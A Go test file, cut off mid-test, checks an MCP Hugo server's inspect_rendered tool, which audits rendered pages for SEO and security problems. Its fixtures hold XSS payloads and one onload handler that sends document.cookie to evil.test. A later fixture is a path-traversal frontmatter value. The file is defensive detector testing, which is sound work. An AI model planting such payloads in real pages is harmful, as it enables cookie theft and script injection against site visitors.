package read_test

import (
	"image"
	"image/color"
	"image/jpeg"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/jmrGrav/mcp-hugo-server-go/internal/config"
	"github.com/jmrGrav/mcp-hugo-server-go/internal/hugosite"
	"github.com/jmrGrav/mcp-hugo-server-go/internal/site"
	"github.com/modelcontextprotocol/go-sdk/mcp"
)

// writeTestJPEG encodes a real (if trivial) JPEG so image.DecodeConfig can
// successfully report its dimensions, exercising checkFeaturedImage's
// dimensions-in-Detail path end-to-end rather than just its "can't decode,
// omit dimensions" fallback.
func writeTestJPEG(t *testing.T, path string, width, height int) {
	t.Helper()
	img := image.NewRGBA(image.Rect(0, 0, width, height))
	for y := 0; y < height; y++ {
		for x := 0; x < width; x++ {
			img.Set(x, y, color.RGBA{R: 100, G: 120, B: 140, A: 255})
		}
	}
	f, err := os.Create(path)
	if err != nil {
		t.Fatalf("create %s: %v", path, err)
	}
	defer f.Close()
	if err := jpeg.Encode(f, img, nil); err != nil {
		t.Fatalf("encode jpeg: %v", err)
	}
}

func writeRenderedHTML(t *testing.T, siteRoot, rel, body string) {
	t.Helper()
	full := filepath.Join(siteRoot, filepath.FromSlash(rel))
	if err := os.MkdirAll(filepath.Dir(full), 0o755); err != nil {
		t.Fatalf("mkdir: %v", err)
	}
	if err := os.WriteFile(full, []byte(body), 0o644); err != nil {
		t.Fatalf("write %s: %v", rel, err)
	}
}

func inspectRenderedPageConfig(siteRoot string) config.Config {
	cfg := config.Default()
	cfg.SiteRoot = siteRoot
	cfg.SiteURL = "https://example.test"
	cfg.SiteName = "example.test"
	cfg.DefaultLanguage = "en"
	cfg.MaxIndexEntries = 1000
	return cfg
}

func inspectRenderedPageIndex(t *testing.T, siteRoot string) *site.Index {
	t.Helper()
	idx, err := site.NewIndex(inspectRenderedPageConfig(siteRoot))
	if err != nil {
		t.Fatalf("NewIndex() error = %v", err)
	}
	return idx
}

// newInspectRenderedPageClient wires the tool with a cfg.SiteRoot matching
// the index's own siteRoot — RegisterInspectRenderedPage reads the rendered
// HTML file straight off disk via cfg.SiteRoot, so the two must agree
// (unlike most other read tools here, which only ever read from idx).
func newInspectRenderedPageClient(t *testing.T, siteRoot string, idx *site.Index) (*mcp.ClientSession, func()) {
	t.Helper()
	return newTestClientWithCfg(t, idx, inspectRenderedPageConfig(siteRoot), nil)
}

func findChecks(t *testing.T, data map[string]any) map[string]map[string]any {
	t.Helper()
	raw, ok := data["checks"].([]any)
	if !ok {
		t.Fatalf("checks field type = %T", data["checks"])
	}
	out := make(map[string]map[string]any, len(raw))
	for _, c := range raw {
		m, ok := c.(map[string]any)
		if !ok {
			t.Fatalf("check entry type = %T", c)
		}
		name, _ := m["check"].(string)
		out[name] = m
	}
	return out
}

func TestInspectRenderedPageCleanPagePassesAllChecks(t *testing.T) {
	siteRoot := t.TempDir()
	writeRenderedHTML(t, siteRoot, "posts/hello/index.html", `<!DOCTYPE html>
<html lang="en">
<head>
<title>Hello World</title>
<meta name="description" content="A short, valid description of this page.">
<link rel="canonical" href="https://example.test/posts/hello/">
</head>
<body>
<p>Hello. <a href="/posts/other/">other post</a></p>
<img src="/images/hello.png">
</body>
</html>`)
	writeRenderedHTML(t, siteRoot, "posts/other/index.html", `<!DOCTYPE html>
<html lang="en">
<head><title>Other</title><meta name="description" content="Other page description text here."><link rel="canonical" href="https://example.test/posts/other/"></head>
<body>Other.</body>
</html>`)
	if err := os.MkdirAll(filepath.Join(siteRoot, "images"), 0o755); err != nil {
		t.Fatalf("mkdir images: %v", err)
	}
	if err := os.WriteFile(filepath.Join(siteRoot, "images", "hello.png"), []byte("fake-png"), 0o644); err != nil {
		t.Fatalf("write image: %v", err)
	}

	idx := inspectRenderedPageIndex(t, siteRoot)
	session, done := newInspectRenderedPageClient(t, siteRoot, idx)
	defer done()

	res := callTool(t, session, "inspect_rendered", map[string]any{"slug": "/posts/hello/"})
	if res.IsError {
		t.Fatalf("inspect_rendered returned error: %v", res.Content[0].(*mcp.TextContent).Text)
	}
	assertEnvelopeContentProvenance(t, res, "site_rendered_public_untrusted")
	data := decodeContent(t, res)
	if got := data["status"]; got != "ok" {
		t.Fatalf("status = %v, want ok; checks = %v", got, data["checks"])
	}
	checks := findChecks(t, data)
	for _, name := range []string{"title", "meta_description", "canonical", "hreflang", "internal_links", "missing_images", "security_title_markup", "security_inline_event_handlers", "security_unsafe_urls", "security_preview_token_leak", "render_errors"} {
		c, ok := checks[name]
		if !ok {
			t.Fatalf("missing check %q", name)
		}
		if c["status"] != "pass" {
			t.Fatalf("check %q status = %v, want pass (detail=%v)", name, c["status"], c["detail"])
		}
	}
}

func TestInspectRenderedPageFlagsMissingSEOFields(t *testing.T) {
	siteRoot := t.TempDir()
	writeRenderedHTML(t, siteRoot, "posts/bare/index.html", `<!DOCTYPE html>
<html lang="en">
<head></head>
<body>No title, no description, no canonical.</body>
</html>`)

	idx := inspectRenderedPageIndex(t, siteRoot)
	session, done := newInspectRenderedPageClient(t, siteRoot, idx)
	defer done()

	res := callTool(t, session, "inspect_rendered", map[string]any{"slug": "/posts/bare/"})
	if res.IsError {
		t.Fatalf("inspect_rendered returned error: %v", res.Content[0].(*mcp.TextContent).Text)
	}
	data := decodeContent(t, res)
	if got := data["status"]; got != "issues_found" {
		t.Fatalf("status = %v, want issues_found", got)
	}
	checks := findChecks(t, data)
	for _, name := range []string{"title", "meta_description", "canonical"} {
		if checks[name]["status"] != "fail" {
			t.Fatalf("check %q status = %v, want fail", name, checks[name]["status"])
		}
	}
}

func TestInspectRenderedPageFlagsBrokenLinkAndMissingImage(t *testing.T) {
	siteRoot := t.TempDir()
	writeRenderedHTML(t, siteRoot, "posts/broken/index.html", `<!DOCTYPE html>
<html lang="en">
<head><title>Broken</title><meta name="description" content="Valid enough description."><link rel="canonical" href="https://example.test/posts/broken/"></head>
<body>
<a href="/posts/does-not-exist/">missing target</a>
<img src="/images/missing.png">
</body>
</html>`)

	idx := inspectRenderedPageIndex(t, siteRoot)
	session, done := newInspectRenderedPageClient(t, siteRoot, idx)
	defer done()

	res := callTool(t, session, "inspect_rendered", map[string]any{"slug": "/posts/broken/"})
	if res.IsError {
		t.Fatalf("inspect_rendered returned error: %v", res.Content[0].(*mcp.TextContent).Text)
	}
	data := decodeContent(t, res)
	checks := findChecks(t, data)
	if checks["internal_links"]["status"] != "fail" {
		t.Fatalf("internal_links status = %v, want fail", checks["internal_links"]["status"])
	}
	if checks["missing_images"]["status"] != "fail" {
		t.Fatalf("missing_images status = %v, want fail", checks["missing_images"]["status"])
	}
}

func TestInspectRenderedPageFlagsRenderErrorMarker(t *testing.T) {
	siteRoot := t.TempDir()
	writeRenderedHTML(t, siteRoot, "posts/errpage/index.html", `<!DOCTYPE html>
<html lang="en">
<head><title>Err Page</title><meta name="description" content="Valid enough description."><link rel="canonical" href="https://example.test/posts/errpage/"></head>
<body>error calling "foo": something broke</body>
</html>`)

	idx := inspectRenderedPageIndex(t, siteRoot)
	session, done := newInspectRenderedPageClient(t, siteRoot, idx)
	defer done()

	res := callTool(t, session, "inspect_rendered", map[string]any{"slug": "/posts/errpage/"})
	if res.IsError {
		t.Fatalf("inspect_rendered returned error: %v", res.Content[0].(*mcp.TextContent).Text)
	}
	data := decodeContent(t, res)
	checks := findChecks(t, data)
	if checks["render_errors"]["status"] != "fail" {
		t.Fatalf("render_errors status = %v, want fail", checks["render_errors"]["status"])
	}
}

func TestInspectRenderedPageFlagsTitleMarkupInjection(t *testing.T) {
	siteRoot := t.TempDir()
	writeRenderedHTML(t, siteRoot, "posts/title-xss/index.html", `<!DOCTYPE html>
<html lang="en">
<head><title>Hello <img src=x onerror=alert(1)></title><meta name="description" content="Valid enough description."><link rel="canonical" href="https://example.test/posts/title-xss/"></head>
<body>Body.</body>
</html>`)

	idx := inspectRenderedPageIndex(t, siteRoot)
	session, done := newInspectRenderedPageClient(t, siteRoot, idx)
	defer done()

	res := callTool(t, session, "inspect_rendered", map[string]any{"slug": "/posts/title-xss/"})
	if res.IsError {
		t.Fatalf("inspect_rendered returned error: %v", res.Content[0].(*mcp.TextContent).Text)
	}
	checks := findChecks(t, decodeContent(t, res))
	if got := checks["security_title_markup"]["status"]; got != "fail" {
		t.Fatalf("security_title_markup status = %v, want fail", got)
	}
}

func TestInspectRenderedPageFlagsInlineEventHandlersAndUnsafeURLs(t *testing.T) {
	siteRoot := t.TempDir()
	writeRenderedHTML(t, siteRoot, "posts/security/index.html", `<!DOCTYPE html>
<html lang="en">
<head><title>Security</title><meta name="description" content="Valid enough description."><link rel="canonical" href="https://example.test/posts/security/"></head>
<body>
<a href="javascript:alert(1)">boom</a>
<img src="/images/ok.png" onerror="alert(1)">
<form action="data:text/html;base64,AAAA"></form>
</body>
</html>`)
	if err := os.MkdirAll(filepath.Join(siteRoot, "images"), 0o755); err != nil {
		t.Fatalf("mkdir images: %v", err)
	}
	if err := os.WriteFile(filepath.Join(siteRoot, "images", "ok.png"), []byte("ok"), 0o644); err != nil {
		t.Fatalf("write image: %v", err)
	}

	idx := inspectRenderedPageIndex(t, siteRoot)
	session, done := newInspectRenderedPageClient(t, siteRoot, idx)
	defer done()

	res := callTool(t, session, "inspect_rendered", map[string]any{"slug": "/posts/security/"})
	if res.IsError {
		t.Fatalf("inspect_rendered returned error: %v", res.Content[0].(*mcp.TextContent).Text)
	}
	checks := findChecks(t, decodeContent(t, res))
	if got := checks["security_inline_event_handlers"]["status"]; got != "fail" {
		t.Fatalf("security_inline_event_handlers status = %v, want fail", got)
	}
	if got := checks["security_unsafe_urls"]["status"]; got != "fail" {
		t.Fatalf("security_unsafe_urls status = %v, want fail", got)
	}
}

func TestInspectRenderedPageAllowsBenignStylesheetPreloadOnloadPattern(t *testing.T) {
	siteRoot := t.TempDir()
	writeRenderedHTML(t, siteRoot, "posts/preload/index.html", `<!DOCTYPE html>
<html lang="en">
<head>
<title>Preload</title>
<meta name="description" content="Valid enough description.">
<link rel="canonical" href="https://example.test/posts/preload/">
<link rel="preload" as="style" href="/css/site.css" onload="this.onload=null;this.rel='stylesheet'">
</head>
<body><p>Safe preload pattern.</p></body>
</html>`)

	idx := inspectRenderedPageIndex(t, siteRoot)
	session, done := newInspectRenderedPageClient(t, siteRoot, idx)
	defer done()

	res := callTool(t, session, "inspect_rendered", map[string]any{"slug": "/posts/preload/"})
	if res.IsError {
		t.Fatalf("inspect_rendered returned error: %v", res.Content[0].(*mcp.TextContent).Text)
	}
	checks := findChecks(t, decodeContent(t, res))
	if got := checks["security_inline_event_handlers"]["status"]; got != "pass" {
		t.Fatalf("security_inline_event_handlers status = %v, want pass for benign preload/onload pattern", got)
	}
}

// TestInspectRenderedPageFlagsPreloadOnloadThatEmbedsExtraCode is a
// regression test for isBenignStylesheetPreloadOnload's allowlist: it must
// require an exact match against the known-safe loadCSS polyfill idiom, not
// merely contain it as a substring. An onload value that embeds the benign
// pattern as a prefix but appends additional executable code after it (e.g.
// via a trailing `;`) is exactly the kind of injected inline handler
// security_inline_event_handlers exists to catch, and must still fail even
// though it contains "this.rel='stylesheet'".
func TestInspectRenderedPageFlagsPreloadOnloadThatEmbedsExtraCode(t *testing.T) {
	siteRoot := t.TempDir()
	writeRenderedHTML(t, siteRoot, "posts/preload-evil/index.html", `<!DOCTYPE html>
<html lang="en">
<head>
<title>Preload</title>
<meta name="description" content="Valid enough description.">
<link rel="canonical" href="https://example.test/posts/preload-evil/">
<link rel="preload" as="style" href="/css/site.css" onload="this.rel='stylesheet';fetch('https://evil.test/x?c='+document.cookie)">
</head>
<body><p>Malicious preload pattern.</p></body>
</html>`)

	idx := inspectRenderedPageIndex(t, siteRoot)
	session, done := newInspectRenderedPageClient(t, siteRoot, idx)
	defer done()

	res := callTool(t, session, "inspect_rendered", map[string]any{"slug": "/posts/preload-evil/"})
	if res.IsError {
		t.Fatalf("inspect_rendered returned error: %v", res.Content[0].(*mcp.TextContent).Text)
	}
	checks := findChecks(t, decodeContent(t, res))
	if got := checks["security_inline_event_handlers"]["status"]; got != "fail" {
		t.Fatalf("security_inline_event_handlers status = %v, want fail — an onload value that merely embeds the benign pattern as a substring, with extra code appended, must not be exempted", got)
	}
}

// TestInspectRenderedPageFlagsVBScriptURL is a regression test for a CodeQL
// "Incomplete URL scheme check" finding (go/incomplete-url-scheme-check):
// checkRenderedUnsafeURLs flagged javascript: and data: URLs but not
// vbscript:, an equally executable URL scheme in legacy IE-rendering
// contexts. Fails against the pre-fix switch (no vbscript: case) and
// passes once vbscript: is flagged alongside javascript:.
func TestInspectRenderedPageFlagsVBScriptURL(t *testing.T) {
	siteRoot := t.TempDir()
	writeRenderedHTML(t, siteRoot, "posts/vbscript/index.html", `<!DOCTYPE html>
<html lang="en">
<head><title>VBScript</title><meta name="description" content="Valid enough description."><link rel="canonical" href="https://example.test/posts/vbscript/"></head>
<body>
<a href="vbscript:msgbox(1)">boom</a>
</body>
</html>`)

	idx := inspectRenderedPageIndex(t, siteRoot)
	session, done := newInspectRenderedPageClient(t, siteRoot, idx)
	defer done()

	res := callTool(t, session, "inspect_rendered", map[string]any{"slug": "/posts/vbscript/"})
	if res.IsError {
		t.Fatalf("inspect_rendered returned error: %v", res.Content[0].(*mcp.TextContent).Text)
	}
	checks := findChecks(t, decodeContent(t, res))
	if got := checks["security_unsafe_urls"]["status"]; got != "fail" {
		t.Fatalf("security_unsafe_urls status = %v, want fail for vbscript: URL", got)
	}
}

func TestInspectRenderedPageFlagsPreviewTokenLeakPattern(t *testing.T) {
	siteRoot := t.TempDir()
	writeRenderedHTML(t, siteRoot, "posts/preview-leak/index.html", `<!DOCTYPE html>
<html lang="en">
<head><title>Preview leak</title><meta name="description" content="Valid enough description."><link rel="canonical" href="https://example.test/posts/preview-leak/"></head>
<body><a href="/preview/0123456789abcdef/0123456789abcdef0123456789abcdef0123456789abcdef/">share</a></body>
</html>`)

	idx := inspectRenderedPageIndex(t, siteRoot)
	session, done := newInspectRenderedPageClient(t, siteRoot, idx)
	defer done()

	res := callTool(t, session, "inspect_rendered", map[string]any{"slug": "/posts/preview-leak/"})
	if res.IsError {
		t.Fatalf("inspect_rendered returned error: %v", res.Content[0].(*mcp.TextContent).Text)
	}
	checks := findChecks(t, decodeContent(t, res))
	if got := checks["security_preview_token_leak"]["status"]; got != "fail" {
		t.Fatalf("security_preview_token_leak status = %v, want fail", got)
	}
}

func TestInspectRenderedPageMultilingualWarnsMissingHreflang(t *testing.T) {
	siteRoot := t.TempDir()
	writeRenderedHTML(t, siteRoot, "en/posts/hi/index.html", `<!DOCTYPE html>
<html lang="en">
<head><title>Hi</title><meta name="description" content="English description text."><link rel="canonical" href="https://example.test/en/posts/hi/"></head>
<body>Hi.</body>
</html>`)
	writeRenderedHTML(t, siteRoot, "fr/posts/salut/index.html", `<!DOCTYPE html>
<html lang="fr">
<head><title>Salut</title><meta name="description" content="Description en francais ici."><link rel="canonical" href="https://example.test/fr/posts/salut/"></head>
<body>Salut.</body>
</html>`)

	idx := inspectRenderedPageIndex(t, siteRoot)
	session, done := newInspectRenderedPageClient(t, siteRoot, idx)
	defer done()

	res := callTool(t, session, "inspect_rendered", map[string]any{"slug": "/en/posts/hi/"})
	if res.IsError {
		t.Fatalf("inspect_rendered returned error: %v", res.Content[0].(*mcp.TextContent).Text)
	}
	data := decodeContent(t, res)
	checks := findChecks(t, data)
	if checks["hreflang"]["status"] != "warn" {
		t.Fatalf("hreflang status = %v, want warn (site is multilingual, no hreflang tags present)", checks["hreflang"]["status"])
	}
	if got := data["status"]; got != "warnings_found" {
		t.Fatalf("status = %v, want warnings_found", got)
	}
}

// TestInspectRenderedPageHreflangDetectionAttributeOrderCaseAndRelCombining
// covers #420: hreflang detection walks the parsed DOM, not raw HTML text,
// so a real <link rel="alternate" hreflang="fr" href="..."> tag must be
// found regardless of attribute order, attribute-name case, or being
// combined with other rel values.
func TestInspectRenderedPageHreflangDetectionAttributeOrderCaseAndRelCombining(t *testing.T) {
	cases := []struct {
		name string
		link string
	}{
		{"reordered attributes", `<link href="https://example.test/fr/posts/salut/" hreflang="fr" rel="alternate">`},
		{"uppercase attribute names", `<link REL="alternate" HREFLANG="fr" HREF="https://example.test/fr/posts/salut/">`},
		{"combined with another rel value", `<link rel="alternate stylesheet" hreflang="fr" href="https://example.test/fr/posts/salut/">`},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			siteRoot := t.TempDir()
			writeRenderedHTML(t, siteRoot, "en/posts/hi/index.html", `<!DOCTYPE html>
<html lang="en">
<head><title>Hi</title><meta name="description" content="English description text."><link rel="canonical" href="https://example.test/en/posts/hi/">`+tc.link+`</head>
<body>Hi.</body>
</html>`)
			writeRenderedHTML(t, siteRoot, "fr/posts/salut/index.html", `<!DOCTYPE html>
<html lang="fr">
<head><title>Salut</title><meta name="description" content="Description en francais ici."><link rel="canonical" href="https://example.test/fr/posts/salut/"></head>
<body>Salut.</body>
</html>`)

			idx := inspectRenderedPageIndex(t, siteRoot)
			session, done := newInspectRenderedPageClient(t, siteRoot, idx)
			defer done()

			res := callTool(t, session, "inspect_rendered", map[string]any{"slug": "/en/posts/hi/"})
			if res.IsError {
				t.Fatalf("inspect_rendered returned error: %v", res.Content[0].(*mcp.TextContent).Text)
			}
			data := decodeContent(t, res)
			checks := findChecks(t, data)
			if checks["hreflang"]["status"] != "pass" {
				t.Fatalf("hreflang status = %v, want pass (%s)", checks["hreflang"]["status"], tc.name)
			}
		})
	}
}

// TestInspectRenderedPageHreflangWithEmptyHrefIsIncomplete covers #420's
// acceptance criterion that a hreflang tag with an empty href must still be
// flagged, not silently accepted as a valid alternate.
func TestInspectRenderedPageHreflangWithEmptyHrefIsIncomplete(t *testing.T) {
	siteRoot := t.TempDir()
	writeRenderedHTML(t, siteRoot, "en/posts/hi/index.html", `<!DOCTYPE html>
<html lang="en">
<head><title>Hi</title><meta name="description" content="English description text."><link rel="canonical" href="https://example.test/en/posts/hi/"><link rel="alternate" hreflang="fr" href=""></head>
<body>Hi.</body>
</html>`)
	writeRenderedHTML(t, siteRoot, "fr/posts/salut/index.html", `<!DOCTYPE html>
<html lang="fr">
<head><title>Salut</title><meta name="description" content="Description en francais ici."><link rel="canonical" href="https://example.test/fr/posts/salut/"></head>
<body>Salut.</body>
</html>`)

	idx := inspectRenderedPageIndex(t, siteRoot)
	session, done := newInspectRenderedPageClient(t, siteRoot, idx)
	defer done()

	res := callTool(t, session, "inspect_rendered", map[string]any{"slug": "/en/posts/hi/"})
	if res.IsError {
		t.Fatalf("inspect_rendered returned error: %v", res.Content[0].(*mcp.TextContent).Text)
	}
	data := decodeContent(t, res)
	checks := findChecks(t, data)
	if checks["hreflang"]["status"] != "warn" {
		t.Fatalf("hreflang status = %v, want warn (href is empty, must not be accepted as a valid alternate)", checks["hreflang"]["status"])
	}
}

// TestInspectRenderedPageHreflangMultipleTranslationsAllFound covers #420's
// acceptance criterion of multiple translations: any one valid alternate is
// enough to pass, regardless of how many other <link> tags are present.
func TestInspectRenderedPageHreflangMultipleTranslationsAllFound(t *testing.T) {
	siteRoot := t.TempDir()
	writeRenderedHTML(t, siteRoot, "en/posts/hi/index.html", `<!DOCTYPE html>
<html lang="en">
<head><title>Hi</title><meta name="description" content="English description text."><link rel="canonical" href="https://example.test/en/posts/hi/">
<link rel="alternate" hreflang="fr" href="https://example.test/fr/posts/salut/">
<link rel="alternate" hreflang="de" href="https://example.test/de/posts/hallo/">
</head>
<body>Hi.</body>
</html>`)
	writeRenderedHTML(t, siteRoot, "fr/posts/salut/index.html", `<!DOCTYPE html>
<html lang="fr">
<head><title>Salut</title><meta name="description" content="Description en francais ici."><link rel="canonical" href="https://example.test/fr/posts/salut/"></head>
<body>Salut.</body>
</html>`)
	writeRenderedHTML(t, siteRoot, "de/posts/hallo/index.html", `<!DOCTYPE html>
<html lang="de">
<head><title>Hallo</title><meta name="description" content="Eine ausreichend lange Beschreibung."><link rel="canonical" href="https://example.test/de/posts/hallo/"></head>
<body>Hallo.</body>
</html>`)

	idx := inspectRenderedPageIndex(t, siteRoot)
	session, done := newInspectRenderedPageClient(t, siteRoot, idx)
	defer done()

	res := callTool(t, session, "inspect_rendered", map[string]any{"slug": "/en/posts/hi/"})
	if res.IsError {
		t.Fatalf("inspect_rendered returned error: %v", res.Content[0].(*mcp.TextContent).Text)
	}
	data := decodeContent(t, res)
	checks := findChecks(t, data)
	if checks["hreflang"]["status"] != "pass" {
		t.Fatalf("hreflang status = %v, want pass", checks["hreflang"]["status"])
	}
}

// TestInspectRenderedPageHreflangMonolingualSiteDoesNotFalsePositive covers
// #420's acceptance criterion of a monolingual site: with only one language
// across the whole public index, hreflang is not applicable at all, and the
// check must pass without requiring any <link rel="alternate"> tag —
// treating this as a false positive would incorrectly flag every
// single-language site as missing translations.
func TestInspectRenderedPageHreflangMonolingualSiteDoesNotFalsePositive(t *testing.T) {
	siteRoot := t.TempDir()
	writeRenderedHTML(t, siteRoot, "posts/hi/index.html", `<!DOCTYPE html>
<html lang="en">
<head><title>Hi</title><meta name="description" content="English description text."><link rel="canonical" href="https://example.test/posts/hi/"></head>
<body>Hi.</body>
</html>`)

	idx := inspectRenderedPageIndex(t, siteRoot)
	session, done := newInspectRenderedPageClient(t, siteRoot, idx)
	defer done()

	res := callTool(t, session, "inspect_rendered", map[string]any{"slug": "/posts/hi/"})
	if res.IsError {
		t.Fatalf("inspect_rendered returned error: %v", res.Content[0].(*mcp.TextContent).Text)
	}
	data := decodeContent(t, res)
	checks := findChecks(t, data)
	if checks["hreflang"]["status"] != "pass" {
		t.Fatalf("hreflang status = %v, want pass (single-language site, hreflang not applicable)", checks["hreflang"]["status"])
	}
}

// TestInspectRenderedPageFlagsCanonicalMismatch proves the canonical check
// compares against an independently-derived expected URL (cfg.SiteURL +
// slug), not against page.URL — which the index copies straight out of the
// same <link rel="canonical"> tag during indexing (comparing against that
// would be comparing the tag to itself and could never catch a real
// mismatch). The realistic failure this check exists for: the site was
// rendered with a different baseURL than the one currently configured in
// cfg.SiteURL (e.g. a stray staging build, or a config drift), so the
// canonical's host disagrees with the configured site URL even though the
// path is correct.
func TestInspectRenderedPageFlagsCanonicalMismatch(t *testing.T) {
	siteRoot := t.TempDir()
	writeRenderedHTML(t, siteRoot, "posts/drifted/index.html", `<!DOCTYPE html>
<html lang="en">
<head><title>Drifted</title><meta name="description" content="Valid enough description."><link rel="canonical" href="https://staging.example.test/posts/drifted/"></head>
<body>Body.</body>
</html>`)

	idx := inspectRenderedPageIndex(t, siteRoot)
	session, done := newInspectRenderedPageClient(t, siteRoot, idx)
	defer done()

	res := callTool(t, session, "inspect_rendered", map[string]any{"slug": "/posts/drifted/"})
	if res.IsError {
		t.Fatalf("inspect_rendered returned error: %v", res.Content[0].(*mcp.TextContent).Text)
	}
	data := decodeContent(t, res)
	checks := findChecks(t, data)
	if checks["canonical"]["status"] != "warn" {
		t.Fatalf("canonical status = %v, want warn (rendered canonical host %q differs from configured cfg.SiteURL)", checks["canonical"]["status"], "staging.example.test")
	}
}

// newInspectRenderedPageClientWithSource wires a real hugosite.SourceIndex
// (built from contentRoot) alongside the site.Index (built from siteRoot),
// so resolved.Source is populated and checkFeaturedImage's frontmatter read
// path is actually exercised — the plain newInspectRenderedPageClient helper
// above passes a nil srcIdx, so resolved.Source is always nil there and
// checkFeaturedImage only ever takes its "no source available" pass path.
func newInspectRenderedPageClientWithSource(t *testing.T, siteRoot, contentRoot string, idx *site.Index) (*mcp.ClientSession, func()) {
	t.Helper()
	srcIdx, err := hugosite.NewSourceIndex(contentRoot)
	if err != nil {
		t.Fatalf("NewSourceIndex() error = %v", err)
	}
	cfg := inspectRenderedPageConfig(siteRoot)
	cfg.ContentRoot = contentRoot
	return newTestClientWithCfg(t, idx, cfg, srcIdx)
}

// TestInspectRenderedPageFeaturedImagePassesWithDimensions is a regression
// test for #818: a configured, existing featuredImage with alt text and a
// matching og:image must pass, and report decoded pixel dimensions in Detail.
func TestInspectRenderedPageFeaturedImagePassesWithDimensions(t *testing.T) {
	siteRoot := t.TempDir()
	contentRoot := t.TempDir()

	writeRenderedHTML(t, siteRoot, "posts/hero/index.html", `<!DOCTYPE html>
<html lang="en">
<head>
<title>Hero</title>
<meta name="description" content="A post with a proper hero image.">
<link rel="canonical" href="https://example.test/posts/hero/">
<meta property="og:image" content="https://example.test/images/hero-featured.jpg">
</head>
<body>
<img data-src="/images/hero-featured.jpg" alt="Hero image">
</body>
</html>`)
	if err := os.MkdirAll(filepath.Join(siteRoot, "images"), 0o755); err != nil {
		t.Fatalf("mkdir images: %v", err)
	}
	writeTestJPEG(t, filepath.Join(siteRoot, "images", "hero-featured.jpg"), 12, 8)

	if err := os.MkdirAll(filepath.Join(contentRoot, "posts", "hero"), 0o755); err != nil {
		t.Fatalf("mkdir content: %v", err)
	}
	page := "---\ntitle: Hero\nfeaturedImage: /images/hero-featured.jpg\n---\n\nBody.\n"
	if err := os.WriteFile(filepath.Join(contentRoot, "posts", "hero", "index.md"), []byte(page), 0o644); err != nil {
		t.Fatalf("write content: %v", err)
	}

	idx := inspectRenderedPageIndex(t, siteRoot)
	session, done := newInspectRenderedPageClientWithSource(t, siteRoot, contentRoot, idx)
	defer done()

	res := callTool(t, session, "inspect_rendered", map[string]any{"slug": "/posts/hero/"})
	if res.IsError {
		t.Fatalf("inspect_rendered returned error: %v", res.Content[0].(*mcp.TextContent).Text)
	}
	data := decodeContent(t, res)
	checks := findChecks(t, data)
	fi, ok := checks["featured_image"]
	if !ok {
		t.Fatalf("missing featured_image check, got checks = %v", checks)
	}
	if fi["status"] != "pass" {
		t.Fatalf("featured_image status = %v, want pass (detail=%v)", fi["status"], fi["detail"])
	}
	detail, _ := fi["detail"].(string)
	if !strings.Contains(detail, "dimensions=12x8") {
		t.Fatalf("featured_image detail = %q, want it to include dimensions=12x8", detail)
	}
}

// TestInspectRenderedPageFeaturedImageFailsWhenMissing is a regression test
// for #818: a configured featuredImage whose file doesn't exist in the built
// public output must fail, distinguishing a broken hero image from a
// broken body image (which only moves the separate missing_images check).
func TestInspectRenderedPageFeaturedImageFailsWhenMissing(t *testing.T) {
	siteRoot := t.TempDir()
	contentRoot := t.TempDir()

	writeRenderedHTML(t, siteRoot, "posts/broken-hero/index.html", `<!DOCTYPE html>
<html lang="en">
<head><title>Broken Hero</title><meta name="description" content="A post whose hero image is missing."><link rel="canonical" href="https://example.test/posts/broken-hero/"></head>
<body>Body.</body>
</html>`)

	if err := os.MkdirAll(filepath.Join(contentRoot, "posts", "broken-hero"), 0o755); err != nil {
		t.Fatalf("mkdir content: %v", err)
	}
	page := "---\ntitle: Broken Hero\nfeaturedImage: /images/does-not-exist-featured.jpg\n---\n\nBody.\n"
	if err := os.WriteFile(filepath.Join(contentRoot, "posts", "broken-hero", "index.md"), []byte(page), 0o644); err != nil {
		t.Fatalf("write content: %v", err)
	}

	idx := inspectRenderedPageIndex(t, siteRoot)
	session, done := newInspectRenderedPageClientWithSource(t, siteRoot, contentRoot, idx)
	defer done()

	res := callTool(t, session, "inspect_rendered", map[string]any{"slug": "/posts/broken-hero/"})
	if res.IsError {
		t.Fatalf("inspect_rendered returned error: %v", res.Content[0].(*mcp.TextContent).Text)
	}
	data := decodeContent(t, res)
	if got := data["status"]; got != "issues_found" {
		t.Fatalf("status = %v, want issues_found", got)
	}
	checks := findChecks(t, data)
	if checks["featured_image"]["status"] != "fail" {
		t.Fatalf("featured_image status = %v, want fail (detail=%v)", checks["featured_image"]["status"], checks["featured_image"]["detail"])
	}
	if checks["missing_images"]["status"] != "pass" {
		t.Fatalf("missing_images status = %v, want pass — no <img> tags on this page, only a configured featuredImage", checks["missing_images"]["status"])
	}
}

// TestInspectRenderedPageFeaturedImageRejectsPathTraversal is a regression
// test for a path-traversal vulnerability caught in review before this
// package's PR (#818/#821) merged: featuredImage is a generic,
// agent-writable frontmatter string (settable via update_page's fields
// passthrough, validated only for control characters — not path shape), and
// the original implementation built its filesystem lookup with a bare
// filepath.Join, which runs Clean and collapses "..". A featuredImage of
// "/../../../etc/hostname"-style would resolve outside SiteRoot entirely,
// turning this read-only SEO check into an arbitrary-file existence/size/
// dimensions oracle for anything readable by the server process. The fix
// routes the lookup through security.PathGuard.SafeJoin, the same
// containment primitive every other on-disk lookup in this codebase uses.
// A canary file placed just outside siteRoot proves it is never touched:
// if containment ever regresses, this test would start reporting the
// canary's real size/dimensions in featured_image's Detail instead of fail.
func TestInspectRenderedPageFeaturedImageRejectsPathTraversal(t *testing.T) {
	parent := t.TempDir()
	siteRoot := filepath.Join(parent, "public")
	contentRoot := filepath.Join(parent, "content")
	if err := os.MkdirAll(siteRoot, 0o755); err != nil {
		t.Fatalf("mkdir siteRoot: %v", err)
	}

	// Canary file outside siteRoot — proving containment means this is
	// never Stat'd/Open'd by checkFeaturedImage, regardless of how deep the
	// featuredImage traversal tries to reach.
	canary := filepath.Join(parent, "canary-secret.txt")
	if err := os.WriteFile(canary, []byte("should never be read by inspect_rendered"), 0o644); err != nil {
		t.Fatalf("write canary: %v", err)
	}

	writeRenderedHTML(t, siteRoot, "posts/traversal/index.html", `<!DOCTYPE html>
<html lang="en">
<head><title>Traversal</title><meta name="description" content="A post whose featuredImage attempts path traversal."><link rel="canonical" href="https://example.test/posts/traversal/"></head>
<body>Body.</body>
</html>`)

	if err := os.MkdirAll(filepath.Join(contentRoot, "posts", "traversal"), 0o755); err != nil {
		t.Fatalf("mkdir content: %v", err)
	}
	// "../canary-secret.txt" resolves, via bare filepath.Join+Clean, to a
	// real file one directory above siteRoot — exactly the escape this test
	// guards against.
	page := "---\ntitle: Traversal\nfeaturedImage: /../canary-secret.txt\n---\n\nBody.\n"
